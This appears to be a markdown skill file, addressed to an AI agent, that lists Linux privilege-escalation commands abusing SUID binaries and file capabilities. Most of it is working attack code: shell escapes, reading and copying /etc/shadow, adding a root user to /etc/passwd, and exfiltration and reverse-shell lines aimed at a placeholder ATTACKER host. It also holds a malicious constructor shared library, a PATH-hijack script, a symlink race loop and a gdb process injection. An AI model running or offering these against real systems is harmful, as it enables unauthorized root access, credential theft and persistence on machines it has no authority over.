# SUID/SGID & Capabilities Exploitation Tricks

> **AI LOAD INSTRUCTION**: Load this for detailed SUID binary exploitation commands (GTFOBins top 30), capability-specific abuse techniques, and custom SUID exploitation methodology. Assumes the main [SKILL.md](./SKILL.md) is already loaded for enumeration and general privesc flow.

---

## 1. TOP 30 SUID BINARIES — EXPLOITATION COMMANDS

All commands below assume the binary has the SUID bit set (`-rwsr-xr-x` with root ownership).

### 1.1 Shell / Interpreters

| # | Binary | Exploit Command | Notes |
|---|---|---|---|
| 1 | `bash` | `bash -p` | `-p` preserves effective UID |
| 2 | `sh` | `sh -p` | Same as bash |
| 3 | `dash` | `dash -p` | Common on Debian |
| 4 | `zsh` | `zsh` | Drops to root without flags |
| 5 | `csh` | `csh` | Inherits SUID |
| 6 | `python` | `python -c 'import os; os.execl("/bin/sh","sh","-p")'` | Works for python2/3 |
| 7 | `perl` | `perl -e 'exec "/bin/sh";'` | — |
| 8 | `ruby` | `ruby -e 'exec "/bin/sh"'` | — |
| 9 | `lua` | `lua -e 'os.execute("/bin/sh")'` | — |
| 10 | `php` | `php -r 'pcntl_exec("/bin/sh", ["-p"]);'` | Needs pcntl extension |

### 1.2 File Readers / Editors

| # | Binary | Exploit Command | Notes |
|---|---|---|---|
| 11 | `vim` / `vi` | `vim -c ':!/bin/sh'` | Or `:set shell=/bin/sh` then `:shell` |
| 12 | `nano` | `nano /etc/shadow` → read hashes | No direct shell; use for file read/write |
| 13 | `less` | `less /etc/shadow` → `!/bin/sh` | Press `!` then enter command |
| 14 | `more` | `more /etc/shadow` → `!/bin/sh` | Must be in paging mode (small terminal) |
| 15 | `ed` | `ed` → `!/bin/sh` | Line editor |
| 16 | `man` | `man man` → `!/bin/sh` | Uses pager (less) internally |
| 17 | `view` | `view -c ':!/bin/sh'` | Read-only vim variant |

### 1.3 File Operations

| # | Binary | Exploit Command | Notes |
|---|---|---|---|
| 18 | `cp` | `cp /etc/shadow /tmp/shadow` | Read sensitive files; or overwrite `/etc/passwd` |
| 19 | `mv` | Replace `/etc/passwd` with crafted version | Destructive — backup first |
| 20 | `cat` | `cat /etc/shadow` | Read-only — crack hashes offline |
| 21 | `tee` | `echo 'hacker:...:0:0::/root:/bin/bash' \| tee -a /etc/passwd` | Append to files |
| 22 | `dd` | `dd if=/etc/shadow of=/tmp/shadow` | Raw file copy |

### 1.4 Execution / Utility

| # | Binary | Exploit Command | Notes |
|---|---|---|---|
| 23 | `find` | `find . -exec /bin/sh -p \; -quit` | Classic GTFOBins |
| 24 | `awk` | `awk 'BEGIN {system("/bin/sh -p")}'` | — |
| 25 | `env` | `env /bin/sh -p` | — |
| 26 | `nmap` | Old: `nmap --interactive` → `!sh`; New: `nmap --script=<(echo 'os.execute("/bin/sh")')` | `--interactive` removed in 5.21+ |
| 27 | `strace` | `strace -o /dev/null /bin/sh -p` | Trace = execute |
| 28 | `ltrace` | `ltrace -b -L /bin/sh -p` | Same concept |
| 29 | `taskset` | `taskset 1 /bin/sh -p` | CPU affinity wrapper = execute |
| 30 | `time` | `time /bin/sh -p` | Timing wrapper |

### 1.5 Network Binaries with SUID

| Binary | Exploit | Notes |
|---|---|---|
| `wget` | `wget --post-file=/etc/shadow http://ATTACKER/` | Exfiltrate; or `wget -O /etc/cron.d/rev http://ATTACKER/cron` |
| `curl` | `curl file:///etc/shadow`; `curl -o /etc/cron.d/rev http://ATTACKER/cron` | Read/write files |
| `socat` | `socat stdin exec:/bin/sh,pty,stderr,setsid,sigint,sane` | Full TTY root shell |
| `nc` / `ncat` | Bind/reverse shell as root | `nc -e /bin/sh ATTACKER PORT` |

---

## 2. CAPABILITY-SPECIFIC EXPLOITATION

### 2.1 cap_setuid (Most Dangerous)

Any binary with this capability can change its UID to 0.

```bash
# Python
/usr/bin/python3 = cap_setuid+ep
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'

# Perl
/usr/bin/perl = cap_setuid+ep
perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/bash";'

# PHP
/usr/bin/php = cap_setuid+ep
php -r 'posix_setuid(0); system("/bin/bash");'

# Ruby
/usr/bin/ruby = cap_setuid+ep
ruby -e 'Process::Sys.setuid(0); exec "/bin/bash"'

# Node.js
/usr/bin/node = cap_setuid+ep
node -e 'process.setuid(0); require("child_process").spawn("/bin/bash",{stdio:[0,1,2]})'
```

### 2.2 cap_dac_override (Bypass File Permissions)

Can read/write ANY file regardless of ownership/permissions.

```bash
# If vim has cap_dac_override:
vim /etc/shadow          # Read and edit shadow file
vim /etc/passwd          # Add root-level user
vim /root/.ssh/authorized_keys   # Plant SSH key

# If python has cap_dac_override:
python3 -c '
f = open("/etc/shadow"); print(f.read())
'
# Or write:
python3 -c '
with open("/etc/passwd","a") as f:
    f.write("hacker:$1$xyz$hash:0:0::/root:/bin/bash\n")
'
```

### 2.3 cap_dac_read_search (Read Any File)

```bash
# If tar has cap_dac_read_search:
tar czf /tmp/shadow.tar.gz /etc/shadow
tar xzf /tmp/shadow.tar.gz -C /tmp/

# If base64 has it:
base64 /etc/shadow | base64 -d
```

### 2.4 cap_sys_admin (Mount, BPF, Namespaces)

```bash
# Mount host filesystem (in a container context)
mkdir /mnt/host
mount /dev/sda1 /mnt/host
# Full host access

# Abuse via unshare (create user namespace, remap UID)
unshare -r /bin/bash
# Now root inside the namespace
```

### 2.5 cap_sys_ptrace (Process Injection)

```bash
# Inject into a root process
python3 << 'PYEOF'
import ctypes, sys

libc = ctypes.CDLL("libc.so.6")
PTRACE_ATTACH = 16
PTRACE_POKETEXT = 4
PTRACE_DETACH = 17

pid = int(sys.argv[1])  # PID of root process
libc.ptrace(PTRACE_ATTACH, pid, 0, 0)
# ... inject shellcode into process memory ...
PYEOF

# Simpler: use gdb if available
gdb -p <root_pid> -batch -ex 'call system("chmod +s /bin/bash")'
```

### 2.6 cap_net_raw (Network Sniffing)

```bash
# If tcpdump has cap_net_raw:
tcpdump -i eth0 -w /tmp/capture.pcap -c 1000

# If python has cap_net_raw:
# Use scapy to sniff credentials
python3 -c '
from scapy.all import *
sniff(filter="tcp port 80", prn=lambda p: p.show(), count=50)
'
```

### 2.7 cap_fowner (Change File Ownership)

```bash
# Change ownership of /etc/shadow to current user
python3 -c 'import os; os.chown("/etc/shadow", 1000, 1000)'
# Now read/modify shadow as normal user
```

### 2.8 cap_chown (Change Ownership of Any File)

```bash
# Similar to cap_fowner — take ownership of sensitive files
chown $(id -u):$(id -g) /etc/shadow
```

---

## 3. CUSTOM SUID BINARY EXPLOITATION

### 3.1 Methodology

```
Custom SUID binary found?
│
├── 1. Identify the binary type
│   ├── file /path/to/binary          → ELF? script wrapper?
│   └── strings /path/to/binary       → find hardcoded paths, commands
│
├── 2. Analyze behavior
│   ├── strace /path/to/binary 2>&1   → syscalls (open, exec, access)
│   ├── ltrace /path/to/binary 2>&1   → library calls (system, popen)
│   └── Run with various inputs       → observe behavior
│
├── 3. Find injection vectors
│   ├── Calls system()/popen() with user input? → command injection
│   ├── Opens files from PATH? → PATH hijack
│   ├── Loads shared libs from writable dir? → lib hijack
│   ├── Reads config from writable location? → config poisoning
│   └── Uses relative paths for commands? → PATH hijack
│
└── 4. Exploit
    ├── PATH hijack: export PATH=/tmp:$PATH; create /tmp/<command>
    ├── Lib hijack: place evil .so in writable RPATH/RUNPATH
    ├── Command injection: inject shell metacharacters
    └── Race condition: TOCTOU on checked files
```

### 3.2 PATH Hijacking Example

```bash
# Binary runs "service apache2 restart" (relative path)
strings /usr/local/bin/suid_binary | grep service

# Create malicious "service" in PATH
echo '#!/bin/bash' > /tmp/service
echo 'cp /bin/bash /tmp/bash && chmod +s /tmp/bash' >> /tmp/service
chmod +x /tmp/service
export PATH=/tmp:$PATH

# Execute the SUID binary
/usr/local/bin/suid_binary
# → /tmp/bash -p
```

### 3.3 Shared Library Hijacking via RPATH/RUNPATH

```bash
# Check RPATH/RUNPATH
readelf -d /usr/local/bin/suid_binary | grep -i path
# RUNPATH: /home/user/lib

# Check what libraries it needs
ldd /usr/local/bin/suid_binary
# libcustom.so => not found

# Create malicious library
cat > /tmp/evil.c << 'EOF'
#include <stdlib.h>
#include <unistd.h>
static void pwn() __attribute__((constructor));
void pwn() {
    setuid(0); setgid(0);
    system("/bin/bash -p");
}
EOF
gcc -shared -fPIC -o /home/user/lib/libcustom.so /tmp/evil.c

# Run the SUID binary → root shell
```

### 3.4 TOCTOU Race Condition

```bash
# If SUID binary checks file permission then reads it:
# access("/tmp/userfile", R_OK) → open("/tmp/userfile")

# Race: swap file between check and open
while true; do
    ln -sf /home/user/allowed.txt /tmp/userfile
    ln -sf /etc/shadow /tmp/userfile
done &

# Repeatedly run the SUID binary
while true; do
    /usr/local/bin/suid_binary /tmp/userfile 2>/dev/null | grep root && break
done
```

---

## 4. QUICK-REFERENCE: CAPABILITIES → EXPLOITATION

| Capability | Attack Type | Impact |
|---|---|---|
| `cap_setuid+ep` | Direct UID change | **Root shell** |
| `cap_setgid+ep` | Direct GID change | **Root group** |
| `cap_dac_override+ep` | Read/write any file | **Shadow/passwd edit** |
| `cap_dac_read_search+ep` | Read any file | **Credential dump** |
| `cap_sys_admin+ep` | Mount, BPF, namespace | **Host filesystem** |
| `cap_sys_ptrace+ep` | Process injection | **Root process hijack** |
| `cap_sys_module+ep` | Load kernel modules | **Kernel rootkit** |
| `cap_net_raw+ep` | Raw sockets | **Credential sniffing** |
| `cap_fowner+ep` | Change file ownership | **Shadow ownership** |
| `cap_chown+ep` | Change any ownership | **Same as fowner** |
| `cap_kill+ep` | Signal any process | **DoS / race conditions** |
| `cap_net_bind_service+ep` | Bind port <1024 | **Service impersonation** |
